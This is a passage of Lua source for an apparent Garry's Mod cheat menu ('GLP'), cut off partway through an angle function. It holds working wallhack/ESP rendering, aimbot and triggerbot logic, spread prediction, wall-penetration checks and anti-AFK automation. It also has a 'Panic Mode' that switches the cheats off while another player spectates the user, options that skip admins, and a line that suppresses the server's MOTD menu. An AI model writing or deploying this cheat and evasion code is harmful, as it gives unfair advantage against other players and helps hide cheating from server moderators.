if ulx then ulx.showMotdMenu = function() end end
local iZNX = {}
iZNX.memory = {}
local grad = Material( "gui/gradient" )
local upgrad = Material( "gui/gradient_up" )
local downgrad = Material( "gui/gradient_down" )
local ctext = chat.AddText
surface.CreateFont("HUDLogo2",{size = 35, weight = 100, antialias = 0})
timer.Create("timerversionchecker2",99999999999999999999999999999999,1,function()
hook.Remove("HUDPaint2", "HudVersionChecker")
end)
hook.Add("HUDPaint2", "HudVersionChecker", function()
draw.SimpleTextOutlined( "Thanks For Using GLP Free..."..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", www.lmccoding.weebly.com", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 15, ScrH()/30, Color(255, 0, 0, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)

hook.Add("RenderScreenspaceEffects", "Hook12", function()
	if(not gConn("ESP", "Wallhack", "Enabled")) then return end
	if gui.IsGameUIVisible() then return end
	if gui.IsConsoleVisible() then return end
	if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
	if menuopen then return end
		for k, v in next, player.GetAll() do
		if(not em.IsValid(v) or em.Health(v) < 1 or em.IsDormant(v) or v == me or pm.Team(v) == TEAM_SPECTATOR) then continue end
		if(not Filter(v)) then continue end
		if(not EnemyFilter(v)) then continue end
		Chams(v)
	end
end)

local function ShowNPCs()
	for k, v in pairs(ents.FindByClass("npc_*")) do
	if not Filter(v) then continue end
	local col = Color(0, 255, 0)
	local col2 = Color((100 - em.Health(v)) * 2.55, em.Health(v) * 2.55, 0, 255)
	local pos = em.GetPos(v)
	local min, max = em.GetCollisionBounds(v)
	local pos2 = pos + Vector(0, 0, max.z)
	local pos = vm.ToScreen(pos)
	local pos2 = vm.ToScreen(pos2)
	local hh = 0
	local h = pos.y - pos2.y
	local w = h / 1.7
	local hp = em.Health(v) * h / 100
	local health = em.Health(v)
	local col = (Color(gInt("Home", "Entities ESP Color", "Red:"), gInt("Home", "Entities ESP Color", "Green:"), gInt("Home", "Entities ESP Color", "Blue:")))
	local Ent = v
	local Dist = math.floor(Ent:GetPos():Distance(me:GetShootPos())/40)
	if health < 0 then
	health = 0
	end
	if v:Health() > 0 then
	surface.SetDrawColor(col)
	surface.DrawOutlinedRect(pos.x - w / 2, pos.y - h, w, h)
	local ocol = (Color(0, 0, 0))
	surface.SetDrawColor(ocol)
	surface.DrawOutlinedRect(pos.x - w / 2 - 1, pos.y - h - 1, w + 2, h + 2)
	surface.DrawOutlinedRect(pos.x - w / 2 + 1, pos.y - h + 1, w - 2, h - 2)
	draw.SimpleText(v:GetClass(), "ESPFont", pos.x, pos.y - h - 2 - 7, Color(255, 255, 255), 1, 1)
	surface.SetDrawColor(Color(0, 0, 0))
	local col1 = Color((100 - em.Health(v)) * 2.55, em.Health(v) * 2.55, 0)
	draw.SimpleText(health.." HP", "ESPFont", pos.x, pos.y - 2, col1, 1, 0)
if(hp > h) then hp = h end
local diff = h - hp
surface.SetDrawColor(0, 0, 0, 255)
surface.DrawRect(pos.x - w / 2 - 7, pos.y - h - 1, 5, h + 2)
surface.SetDrawColor(col2)
surface.DrawRect(pos.x - w / 2 - 6, pos.y - h + diff, 3, hp)
end
end
end
local aimtarget
local function OnScreen(v)
if math.abs(v:LocalToWorld(v:OBBCenter()):ToScreen().x) < ScrW()*5 and math.abs(v:LocalToWorld(v:OBBCenter()):ToScreen().y) < ScrH()*5 then
return true
else
return false
end
end
hook.Add("DrawOverlay", "Hook13", function()
if(gConn("ESP", "Wallhack", "Enabled") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible())) && !menuopen) then
for k, v in next, player.GetAll() do
if(v == me or not em.IsValid(v) or em.Health(v) < 0.1 or em.IsDormant(v) or pm.Team(v) == TEAM_SPECTATOR) then continue end
if(not Filter(v)) then continue end
if(not EnemyFilter(v)) then continue end
ESP(v)
end
end
if(gConn("ESP", "Wallhack", "Enabled") && gConn("ESP", "Extra", "Traitor Finder") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible())) && !menuopen) then
TraitorFinder()
end
if(gConn("ESP", "Wallhack", "Enabled") && gConn("ESP", "Extra", "Murderer Finder") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible())) && !menuopen) then
MurdererFinder()
end
if(gConn("ESP", "Extra", "Show NPCs") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible())) && !menuopen) then
ShowNPCs()
end
for k, v in next, ents.GetAll() do
if v:IsDormant() or not v:IsValid() then continue end
if not Filter(v) or not OnScreen(v) or v == me then continue end
if(gConn("ESP", "Extra", "Show Entities") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible())) && !menuopen) then
if table.HasValue(drawn_ents, v:GetClass()) and v:IsValid() and v:GetPos():Distance(me:GetPos()) > 40 then
local pos = em.GetPos(v) + Vector(0, 0, 0)
local pos2 = pos + Vector(0, 0, 0)
local pos = vm.ToScreen(pos)
local pos2 = vm.ToScreen(pos2)
local min, max = v:WorldSpaceAABB()
local origin = v:GetPos()
draw.SimpleText(v:GetClass(), "MiscFont", pos.x, pos.y, Color(255, 255, 255), 1)
cam.Start3D()
render.DrawWireframeBox(origin, Angle(0, 0, 0), min - origin, max - origin, Color(gInt("Home", "Entities ESP Color", "Red:"), gInt("Home", "Entities ESP Color", "Green:"), gInt("Home", "Entities ESP Color", "Blue:")), true) 
cam.End3D()
end
end
end
if gConn("Aimbot", "Aim Options", "Priority List") and menuopen and ScrW() >= 1600 or ScrH() >= 1400 then
PlayerList()
end
if v == me and not em.IsValid(v) then return end
if(gConn("ESP", "Extra", "Spectators") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()))) then
Spectator()
end
if(gConn("ESP", "Extra", "Radar") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()))) then
RadarDraw()
end
if(gConn("ESP", "Extra", "Custom Status") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()))) then
Logo()
Status()
end
if(gConn("Visuals", "Extra", "Players List") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()))) then
Logo2()
Players()
end
if(gConn("Extra", "Extra", "Crosshair") && (!gui.IsGameUIVisible()) && (!gui.IsConsoleVisible()) && (!(IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()))) then
Crosshair()
end
if gui.IsGameUIVisible() then return end
if gui.IsConsoleVisible() then return end
if (IsValid(g_SpawnMenu) && g_SpawnMenu:IsVisible()) then return end
if me:IsTyping() then return end
if menuopen then return end
if me:Team() == TEAM_SPECTATOR then return end
if not me:Alive() or me:Health() < 1 then return end
if (gConn("Triggerbot", "Triggerbot", "Enabled")) then return end
if (gConn("Aimbot", "Ragebot", "Enabled") && gConn("Aimbot", "Legitbot", "Enabled")) then return end
for k, v in pairs(player.GetAll()) do
if(gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable All" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable Ragebot" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable Legitbot" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me) then return end
end
if(aimtarget and em.IsValid(aimtarget) and not NoPhys() and not NoCam() and gConn("Aimbot", "WeaponJacker", "Snap Lines") and (gConn("Aimbot", "Ragebot", "Enabled") or gConn("Aimbot", "Legitbot", "Enabled"))) then
if em.Health(me) > 0 then
local col = Color(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
local pos = vm.ToScreen(em.LocalToWorld(aimtarget, em.OBBCenter(aimtarget)))
surface.SetDrawColor(col)
surface.DrawLine(ScrW() / 2, ScrH() / 2, pos.x, pos.y)
surface.SetDrawColor(0, 0, 0)
surface.DrawOutlinedRect(pos.x - 2, pos.y - 2, 5, 5)
surface.SetDrawColor(gInt("Home", "Crosshair Color", "Red:"), gInt("Home", "Crosshair Color", "Green:"), gInt("Home", "Crosshair Color", "Blue:"), gInt("Home", "Others", "T Opacity:"))
surface.DrawRect(pos.x - 1, pos.y - 1, 3, 3)
end
end
end)

local trace_walls = bit.bor(CONTENTS_TESTFOGVOLUME, CONTENTS_EMPTY, CONTENTS_MONSTER, CONTENTS_HITBOX)

local NoPenetration = {[MAT_SLOSH] = true}

local PenMod = {[MAT_SAND] = 0.5, [MAT_DIRT] = 0.8, [MAT_METAL] = 1.1, [MAT_TILE] = 0.9, [MAT_WOOD] = 1.2}

local trace_normal = bit.bor(CONTENTS_SOLID, CONTENTS_OPAQUE, CONTENTS_MOVEABLE, CONTENTS_DEBRIS, CONTENTS_MONSTER, CONTENTS_HITBOX, 402653442, CONTENTS_WATER)

local function FASAutowall(wep, startPos, aimPos, ply)
if not gConn("Aimbot", "WeaponJacker", "Auto Wall") then return end
local traces = {}
local traceResults = {}
local dir = (aimPos - startPos):GetNormalized()
traces[1] = {start = startPos, filter = me, mask = trace_normal, endpos = aimPos,}
traceResults[1] = util.TraceLine(traces[1])
if(NoPenetration[traceResults[1].MatType]) then return false end
if( - dir:DotProduct(traceResults[1].HitNormal) <= .26) then return false end
traces[2] = {start = traceResults[1].HitPos, endpos = traceResults[1].HitPos + dir * wep.PenStr * (PenMod[traceResults[1].MatType] or 1) * wep.PenMod, filter = me, mask = trace_walls,}
    traceResults[2] = util.TraceLine(traces[2])
    traces[3] = {start = traceResults[2].HitPos, endpos = traceResults[2].HitPos + dir * .1, filter = me, mask = trace_normal,}
    traceResults [3] = util.TraceLine(traces[3])
    traces[4] = {start = traceResults[2].HitPos, endpos = aimPos, filter = me, mask = MASK_SHOT,}
    traceResults[4] = util.TraceLine(traces[4])
    if(traceResults[4].Entity ~= ply) then return false end
    return(not traceResults[3].Hit)
end

local function M9KAutowall(wep)
	if not gConn("Aimbot", "WeaponJacker", "Auto Wall") then return end
	local wep = me:GetActiveWeapon()
    local trace = {
        endpos = aimPos, 
        start = me:EyePos(), 
        mask = MASK_SHOT, 
        filter = me, 
    }
    return wep:BulletPenetrate(10, nil, util.TraceLine(trace), DamageInfo())
end

local function AntiAFK(pCmd)
	if(!gConn("Utilities", "Utilities", "Anti-AFK")) then
		timer.Create("afk1", 6, 0, function()
		local commands = {"moveleft", "moveright", "moveup", "movedown"}
		local command1 = table.Random(commands)
		local command2 = table.Random(commands)
		if unloaded == true then return end
		if(!gConn("Utilities", "Utilities", "Anti-AFK")) then return end
		timer.Create("afk2", 1, 1, function()
		RunConsoleCommand(" + "..command1) RunConsoleCommand(" + "..command2)
			end)
		timer.Create("afk3", 4, 1, function()
		RunConsoleCommand(" - "..command1) RunConsoleCommand(" - "..command2)
			end)
		end)
	end
end

local dists = {}

local function GetPos(v)
	if(gConn("Aimbot", "Aim Options", "Body Aim")) or (v:IsPlayer() and v:IsPlayingTaunt() and gConn("FakeAngles", "Resolver", "Emote Resolver")) then return(em.LocalToWorld(v, em.OBBCenter(v))) end
	local eyes = em.LookupAttachment(v, "eyes")
	if(!eyes) then return(em.LocalToWorld(v, em.OBBCenter(v))) end
	local pos = em.GetAttachment(v, eyes)
	if(!pos) then return(em.LocalToWorld(v, em.OBBCenter(v))) end
	return(pos.Pos)
end

local function LogKills(data)
	local killer = GLPBot.Entity(data.entindex_attacker)
	local victim = GLPBot.Entity(data.entindex_killed)
	if (GLPBot.IsValid(killer) and GLPBot.IsValid(victim) and killer:IsPlayer() and victim:IsPlayer()) then
	GLPBot.surface.PlaySound("buttons/lightswitch2.wav")
		if (killer == victim and victim ~= ply) then
			chat.AddText(Color(255, 255, 0), victim:Nick() .. " killed themself.")
		elseif (killer == victim and victim == ply) then
			chat.AddText(Color(255, 255, 0), "You killed yourself.")
		elseif (killer == ply and victim ~= ply) then
			chat.AddText(Color(255, 255, 0), "You killed " .. victim:Nick() .. ".")
		elseif (killer ~= ply and victim == ply) then
			chat.AddText(Color(255, 255, 0), killer:Nick() .. " killed you.")
		elseif (killer ~= ply and victim ~= ply) then
			chat.AddText(Color(255, 255, 0), killer:Nick() .. " killed " .. victim:Nick() .. ".")
		end
	end
end

hook.Add("entity_killed", "Hook15", function(data)
	if (gConn("Extra", "Chat", "Enable Spams") && gOption("Extra", "Chat", "Kill Spam:") ~= "Off") then
		KillSpam(data)
	end
	if gConn("Extra", "Chat", "Log Kills in Chat") then
		LogKills(data)
	end
end)

local function AimbotPriorities(v)
	if not gConn("Aimbot", "Aim Options", "Ignore Players") and gConn("Aimbot", "Aim Options", "Ignore NPCs") then
		return v:IsPlayer()
	elseif not gConn("Aimbot", "Aim Options", "Ignore NPCs") and gConn("Aimbot", "Aim Options", "Ignore Players") then
		return v:IsNPC()
	elseif not gConn("Aimbot", "Aim Options", "Ignore Players") and not gConn("Aimbot", "Aim Options", "Ignore NPCs") then
		return v:IsPlayer() or v:IsNPC()
	else
		return nil
	end
end

local function TriggerbotPriorities(v)
	if not gConn("Triggerbot", "Aim Options", "Ignore Players") and gConn("Triggerbot", "Aim Options", "Ignore NPCs") then
		return v:IsPlayer()
	elseif not gConn("Triggerbot", "Aim Options", "Ignore NPCs") and gConn("Triggerbot", "Aim Options", "Ignore Players") then
		return v:IsNPC()
	elseif not gConn("Triggerbot", "Aim Options", "Ignore Players") and not gConn("Triggerbot", "Aim Options", "Ignore NPCs") then
		return v:IsPlayer() or v:IsNPC()
	else
		return nil
	end
end

local aimignore

local function Valid(v)
    local wep = me:GetActiveWeapon()
	local maxhealth = gInt("Aimbot", "Aim Options", "Max Health:") 
	if(!v || !em.IsValid(v) || v == me || em.Health(v) < 1 || em.IsDormant(v) || !AimbotPriorities(v) || (v == aimignore && gOption("Aimbot", "Aim Options", "Priority:") == "Random")) then return false end
	if v:IsPlayer() then
	if(gConn("Aimbot", "Aim Options", "Ignore Team")) then
        if(pm.Team(v) == pm.Team(me)) then return false end
    end
	if(gConn("Aimbot", "Aim Options", "Ignore Transparent Players")) then
        if em.GetColor(v).a < 255 then return false end
    end
    if(gConn("Aimbot", "Aim Options", "Ignore Friends")) then
        if(pm.GetFriendStatus(v) == "friend") then return false end
    end
	if(gConn("Aimbot", "Aim Options", "Ignore Bots")) then
		if(pm.IsBot(v)) then return false end
	end
    if(gConn("Aimbot", "Aim Options", "Ignore Admins")) then
        if pm.IsAdmin(v) then return false end
    end
    if(gConn("Aimbot", "Aim Options", "Ignore Driving Players")) then
		if pm.InVehicle(v) then return false end
	end
	if(gConn("Aimbot", "Aim Options", "Ignore Noclip")) then
		if (em.GetMoveType(v) == MOVETYPE_NOCLIP) then return false end
	end
	if(gConn("Aimbot", "Aim Options", "Disable in Noclip")) then
		if (em.GetMoveType(me) == MOVETYPE_NOCLIP) then return false end
	end
	if(gConn("Aimbot", "Aim Options", "Ignore Overhealed Players")) then
		if (v:Health() > maxhealth) then return false end
	end
	if v:Team() == TEAM_SPECTATOR then
		return false
	end
	if table.HasValue(ignore_list, v:UniqueID()) then
		return false
	end
	end
    local tr = {
        start = em.EyePos(me), 
        endpos = GetPos(v), 
        mask = MASK_SHOT, 
        filter = {me, v}, 
    }
    if(util.TraceLine(tr).Fraction == 1) then
        return true
    elseif(wep and wep:IsValid() and wep.PenStr) then
        return FASAutowall(wep, tr.start, tr.endpos, v)
	elseif (wep and wep:IsValid() and wep.BulletPenetrate) then
		return M9KAutowall(wep, tr.start, tr.endpos, v)
    end
    return false
end

function GLPBot.Valid2(v)
	return (v and GLPBot.IsValid(v) and v:Health() > 0 and not v:IsDormant() and ply:GetObserverTarget() ~= v and v:GetMoveType() ~= 10 and TriggerbotPriorities(v))
end

function CrosshairAim()
	dists = {}
		local x, y = ScrW(), ScrH()
		local AngA, AngB = 0
		for k, v in next, ents.GetAll() do
			if(!Valid(v)) then continue end
			
			local EyePos = v:EyePos():ToScreen()
			dists[#dists + 1] = {math.Dist(x / 2, y / 2, EyePos.x, EyePos.y), v}
		end
		table.sort(dists, function(a, b)
			return(a[1] < b[1])
		end)
	aimtarget = dists[1] && dists[1][2] || nil
end

local function GetTarget()
	local opt = gOption("Aimbot", "Aim Options", "Priority:")
	local sticky = gOption("Aimbot", "Ragebot", "Target Lock") or gOption("Aimbot", "Legitbot", "Target Lock")
	if(opt == "Distance") then
		if(sticky && Valid(aimtarget)) then return end
		dists = {}
		for k, v in next, ents.GetAll() do
				if(!Valid(v)) then continue end
				dists[#dists + 1] = {vm.Distance(em.GetPos(v), em.GetPos(me)), v}
		end
		table.sort(dists, function(a, b)
				return(a[1] < b[1])
		end)
		aimtarget = dists[1] && dists[1][2] || nil
	elseif(opt == "Health") then
		if(!sticky && Valid(aimtarget)) then return end
		dists = {}
		for k, v in next, ents.GetAll() do
				if(!Valid(v)) then continue end
				dists[#dists + 1] = {em.Health(v), v}
		end
		table.sort(dists, function(a, b)
				return(a[1] < b[1])
		end)
		aimtarget = dists[1] && dists[1][2] || nil
	elseif(opt == "Random") then
	if(!sticky && Valid(aimtarget)) then return end
		aimtarget = nil
		local allplys = ents.GetAll()
		local avaib = {}
		for k, v in next, allplys do
				avaib[math.random(100)] = v
		end
		for k, v in next, avaib do
				if(Valid(v)) then
						aimtarget = v
				end
		end
	elseif(opt == "Crosshair") then
		CrosshairAim()
	end
end

local cones = {}

local nullvec = Vector() * - 1

local servertime = 0

local sequences = {
    [ACT_VM_DEPLOY] = true, 
    [ACT_VM_DEPLOY_1] = true, 
    [ACT_VM_DEPLOY_2] = true, 
    [ACT_VM_DEPLOY_3] = true, 
    [ACT_VM_DEPLOY_4] = true, 
    [ACT_VM_DEPLOY_5] = true, 
    [ACT_VM_DEPLOY_6] = true, 
    [ACT_VM_DEPLOY_7] = true, 
    [ACT_VM_DEPLOY_8] = true, 
    [ACT_VM_DEPLOY_EMPTY] = true, 
    [ACT_VM_ATTACH_SILENCER] = true, 
    [ACT_VM_DETACH_SILENCER] = true, 
    [ACT_VM_DRAW] = true, 
    [ACT_VM_DRAW_DEPLOYED] = true, 
    [ACT_VM_DRAW_EMPTY] = true, 
    [ACT_VM_DRAW_SILENCED] = true, 
    [ACT_VM_RELOAD] = true, 
    [ACT_VM_RELOAD_DEPLOYED] = true, 
    [ACT_VM_RELOAD_EMPTY] = true, 
}

hook.Add("Move", "Hook16", function()
    if(IsFirstTimePredicted()) then
        servertime = CurTime() + engine.TickInterval()
    end
	if gConn("Aimbot", "WeaponJacker", "Bullet Time") then
		if gConn("Aimbot", "Ragebot", "Auto Fire") or gConn("Aimbot", "Legitbot", "Auto Fire") and gInt("Aimbot", "WeaponJacker", "Fire Delay:") ~= 1 then
			servertime = CurTime() - gInt("Aimbot", "WeaponJacker", "Fire Delay:")/100
		elseif gConn("Triggerbot", "Triggerbot", "Enabled") and gInt("Triggerbot", "Triggerbot", "Fire Delay:") ~= 1 then
			servertime = CurTime() - gInt("Triggerbot", "Triggerbot", "Fire Delay:")/100
		else
			servertime = CurTime()
		end
	end
end)

local function WeaponCanFire()
	local w = pm.GetActiveWeapon(me)
		if(!w || !em.IsValid(w) || !gConn("Aimbot", "WeaponJacker", "Bullet Time")) then return true end
	return(servertime >= wm.GetNextPrimaryFire(w))
end

GAMEMODE["EntityFireBullets"] = function(self, p, data)
	aimignore = aimtarget
	local w = pm.GetActiveWeapon(me)
	local Spread = data.Spread * - 1
	if(not w or not em.IsValid(w) or cones[em.GetClass(w)] == Spread or Spread == nullvec) then return end
	cones[em.GetClass(w)] = Spread
end

local function PredictSpread(pCmd, ang)
	local w = pm.GetActiveWeapon(me)
	if(not w or not em.IsValid(w) or not cones[em.GetClass(w)] or not gConn("Aimbot", "WeaponJacker", "No Spread")) then return am.Forward(ang) end
	return (GLPBotC.Predict(pCmd, am.Forward(ang), cones[em.GetClass(w)]))
end

local function AutoFire(pCmd)
	if(pm.KeyDown(me, 1)) then
		cm.SetButtons(pCmd, bit.band(cm.GetButtons(pCmd), bit.bnot(1)))
	else
		cm.SetButtons(pCmd, bit.bor(cm.GetButtons(pCmd), 1))
	end
end

local function AltFire(pCmd)
	if(pm.KeyDown(me, 1)) then
		cm.SetButtons(pCmd, bit.band(cm.GetButtons(pCmd), bit.bnot(IN_ATTACK2)))
	else
		cm.SetButtons(pCmd, bit.bor(cm.GetButtons(pCmd), IN_ATTACK2))
	end
end

local function PredictPos(pos)
	local myvel = LocalPlayer():GetVelocity()
		local pos = pos - (myvel * engine.TickInterval())
	return pos
end

local function SmoothAim(ang) 
	if(gInt("Aimbot", "Legitbot", "Aim Smoothness:") > 0 && !gConn("Aimbot", "Legitbot", "Silent (For Anti-Aim)")) then
		ang.y = math.NormalizeAngle(ang.y) 	
		ang.p = math.NormalizeAngle(ang.p) 	
		eyeang = LocalPlayer():EyeAngles() 	
		local smooth = gInt("Aimbot", "Legitbot", "Aim Smoothness:") 	
		if((eyeang.y - ang.y) * - 1 > 180 && eyeang.y < 0) 
		then eyeang.y = eyeang.y + 360 end 	if((ang.y - eyeang.y) * - 1 > 180 && ang.y < 0) then ang.y = ang.y + 360 end 	
		eyeang.y = eyeang.y + (ang.y - eyeang.y) / smooth 	eyeang.x = eyeang.x + (ang.x - eyeang.x) / smooth 	eyeang.r = 0 	
		return eyeang else return ang
	end 
end

local function Ragebot(pCmd)
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	for k, v in pairs(player.GetAll()) do
	if(gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable All" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable Ragebot" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || NoPhys() || NoCam()) then return end
	end
	if(cm.CommandNumber(pCmd) == 0 || !gConn("Aimbot", "Ragebot", "Enabled") || gConn("Aimbot", "Legitbot", "Enabled")) then return end
	GetTarget()
	aa = false
	if(aimtarget && aimtarget:IsValid() && AimKeyCheck() && WeaponCanFire()) then
		aa = true
		local pos = GetPos(aimtarget) - em.EyePos(me)
		PredictPos(pos)
		local ang = vm.Angle(PredictSpread(pCmd, vm.Angle(pos)))
		NormalizeAngle(ang)
		cm.SetViewAngles(pCmd, ang)
		if(gConn("Aimbot", "Ragebot", "Auto Fire")) then
			AutoFire(pCmd)
		end
		if(gConn("Aimbot", "Ragebot", "Alt Fire")) then
			AltFire(pCmd)
		end
		if(gConn("Aimbot", "Ragebot", "Silent")) then
			FixMovement(pCmd)
		else
			fa = ang
		end
	end
end

local function Legitbot(pCmd)
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	for k, v in pairs(player.GetAll()) do
	if(gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable All" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || gConn("Aimbot", "WeaponJacker", "Panic Mode") && gOption("Aimbot", "WeaponJacker", "Mode:") == "Disable Legitbot" && IsValid(v:GetObserverTarget()) and v:GetObserverTarget() == me || NoPhys() || NoCam()) then return end
	end
	if(cm.CommandNumber(pCmd) == 0 || !gConn("Aimbot", "Legitbot", "Enabled") || gConn("Aimbot", "Ragebot", "Enabled")) then return end
	GetTarget()
    aa = false
    if(aimtarget && aimtarget:IsValid() && AimKeyCheck2() && WeaponCanFire()) then
	local FovValue = gInt("Aimbot", "Legitbot", "Aim FoV Value:")
	if(FovValue < 0) then
	return end
	if(FovValue > 0) then
	CrosshairAim()
	local pos = GetPos(aimtarget) - em.EyePos(me)
		PredictPos(pos, aimtarget:GetVelocity())
		local ang = vm.Angle(PredictSpread(pCmd, vm.Angle(pos)))
		NormalizeAngle(ang)
		local CalcX = ang.x - fa.x
	    local CalcY = ang.y - fa.y
		if CalcY < 0 then CalcY = CalcY * - 1 end	
		if CalcX < 0 then CalcX = CalcX * - 1 end
		if CalcY > 360 then CalcY = CalcY - 360 end
		if CalcX > 360 then CalcX = CalcX - 360 end
		if CalcY > 180 then CalcY = 360 - CalcY end
		if CalcX > 180 then CalcX = 360 - CalcX end
		if (CalcX <= FovValue/2 && CalcY <= FovValue *0.4) then
		local ang = SmoothAim(ang)
		cm.SetViewAngles(pCmd, ang)
        if(gConn("Aimbot", "Legitbot", "Auto Fire")) then
            AutoFire(pCmd)
        end
		if(gConn("Aimbot", "Legitbot", "Alt Fire")) then
			AltFire(pCmd)
		end
        if(gConn("Aimbot", "Legitbot", "Silent (For Anti-Aim)")) then
            FixMovement(pCmd)
        else
            fa = ang
        end
			end
		end
	end
end

function GLPBot.TriggerFilter(hitbox)
	if (gConn("Triggerbot", "Aim Options", "Priority:") == "Head") then
		return hitbox == 0
	end
	return hitbox ~= nil
end

function GLPBot.Triggerbot(pCmd)
	local maxhealth2 = gInt("Triggerbot", "Triggerbot", "Max Health:")
	if me:Team() == TEAM_SPECTATOR then return end
	if not me:Alive() or me:Health() < 1 then return end
	if not TriggerKeyCheck() then return end
	if pCmd:KeyDown(IN_ATTACK) then return end
	if not (gConn("Triggerbot", "Triggerbot", "Enabled")) then return end
	if (NoPhys()) then return end
	if (NoCam()) then return end
	local trace = ply:GetEyeTraceNoCursor()
	local v = trace.Entity
	local hitbox = trace.HitBox
	if (GLPBot.Valid2(v) and GLPBot.TriggerFilter(hitbox)) then
	if v:IsPlayer() then
	if(gConn("Triggerbot", "Aim Options", "Ignore Team")) then
    if(pm.Team(v) == pm.Team(me)) then return false end
    end
	if(gConn("Triggerbot", "Aim Options", "Ignore Transparent Players")) then
    if em.GetColor(v).a < 255 then return false end
    end
    if(gConn("Triggerbot", "Aim Options", "Ignore Friends")) then
    if(pm.GetFriendStatus(v) == "friend") then return false end
    end
	if(gConn("Triggerbot", "Aim Options", "Ignore Bots")) then
	if(pm.IsBot(v)) then return false end
	end
    if(gConn("Triggerbot", "Aim Options", "Ignore Admins")) then
    if pm.IsAdmin(v) then return false end
    end
    if(gConn("Triggerbot", "Aim Options", "Ignore Driving Players")) then
	if pm.InVehicle(v) then return false end
	end
	if(gConn("Triggerbot", "Aim Options", "Ignore Noclip")) then
	if (em.GetMoveType(v) == MOVETYPE_NOCLIP) then return false end
	end
	if(gConn("Triggerbot", "Aim Options", "Disable in Noclip")) then
	if (em.GetMoveType(me) == MOVETYPE_NOCLIP) then return false end
	end
	if(gConn("Triggerbot", "Aim Options", "Ignore Overhealed Players")) then
	if (v:Health() > maxhealth2) then return false end
	end
	if table.HasValue(ignore_list, v:UniqueID()) then
	return false
	end
	end
	if(gConn("Triggerbot", "Triggerbot", "Alt Fire")) then
	pCmd:SetButtons(pCmd:GetButtons() + IN_ATTACK2)
	end
	if not GLPBot.Valid2(v) then return end
	GLPBot.Triggering = true
	if WeaponCanFire() then
	pCmd:SetButtons(pCmd:GetButtons() + IN_ATTACK)
	end
	else
	GLPBot.Triggering = false
	end
end

local ox = - 181

local oy = 0

local function RandCoin()
	local randcoin = math.random(0, 1)
	if(randcoin == 1) then return 1 else return - 1 end
end

local function GetClosest()
	local ddists = {}
	local closest
	for k, v in next, player.GetAll() do
	if(!Valid(v)) then continue end
	ddists[#ddists + 1] = {vm.Distance(em.GetPos(v), em.GetPos(me)), v}
	end
	table.sort(ddists, function(a, b)
	return(a[1] < b[1])
	end)
	closest = ddists[1] && ddists[1][2] || nil
	if(!closest) then return fa.y end
	local pos = em.GetPos(closest)
	local pos = vm.Angle(pos - em.EyePos(me))
	return(pos.y)
end

local function ViewLock()
	if(gConn("FakeAngles", "FAKEAngles)", "View Lock")) then
		local wep = pm.GetActiveWeapon(me)
				if !IsValid(wep) then return end
		local n = string.lower(wep:GetPrintName())
		ox = 181
		if(string.find(n, "pistol") or string.find(n, "beretta") or string.find(n, "deagle") or string.find(n, "eagle") or string.find(n, "9mm") or string.find(n, "9 mm") or string.find(n, "1911") or string.find(n, "tool") or string.find(n, "glock") or string.find(n, "luger") or string.find(n, "M92") or string.find(n, "M29") or string.find(n, "MR69") or string.find(n, "usp") or string.find(n, "p229r") or string.find(n, "45c")) then
		oy = fa.y + 32
		elseif(string.find(n, "shotgun") or string.find(n, "minigun") or string.find(n, "winchester 1897") or string.find(n, "winchester 87") or string.find(n, "crossbow") or string.find(n, "ithaca") or string.find(n, "mossberg") or string.find(n, "remington 870") or string.find(n, "spas") or string.find(n, "benelli") or string.find(n, "browning")) then
		oy = fa.y + 13.5
		elseif(string.find(n, ".357") or string.find(n, "python") or string.find(n, "satan") or string.find(n, "remington 1858") or string.find(n, "bull") or string.find(n, "model")) then
		oy = fa.y + 35.5
		else
		oy = fa.y - 8
		end
	end
end

local manual = false

local manualpressed = false

local function GetX()
	local opt = gOption("FakeAngles", "FAKEAngles)", "X-Axis:")
